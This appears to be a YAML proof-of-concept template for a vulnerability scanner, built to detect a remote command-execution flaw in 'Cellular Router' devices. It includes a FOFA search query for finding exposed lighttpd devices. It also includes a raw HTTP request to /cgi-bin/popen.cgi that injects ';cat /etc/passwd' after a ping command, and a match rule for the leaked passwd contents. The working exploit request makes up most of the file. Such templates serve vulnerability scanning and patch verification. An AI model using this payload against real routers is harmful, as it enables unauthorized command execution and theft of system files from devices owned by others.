id: cellular-router-rce

info:
  name: Cellular Router命令执行漏洞
  author: fgz
  severity: critical
  verified: true
  description: |
    移动路由器（Cellular Router）是一种利用移动网络提供无线互联网连接的设备。它们类似于传统路由器，但不同于使用有线连接（如以太网或DSL），它们利用移动数据网络来建立互联网连接。Cellular Router存在命令执行漏洞，攻击者通过在受攻击系统上执行恶意命令，从而获取未授权的系统访问权限。
    FOFA: title="index" && header="lighttpd/1.4.30"
  tags: rce
  created: 2023/09/14

set:
  hostname: request.url.host
rules:
  r0:
    request:
      raw: |
        GET /cgi-bin/popen.cgi?command=ping%20-c%204%201.1.1.1;cat%20/etc/passwd&v=0.1303033443137912 HTTP/1.1
        Host: {{hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Upgrade-Insecure-Requests: 1
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: none
        Sec-Fetch-User: ?1
        Te: trailers
        Connection: close
    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
expression: r0()
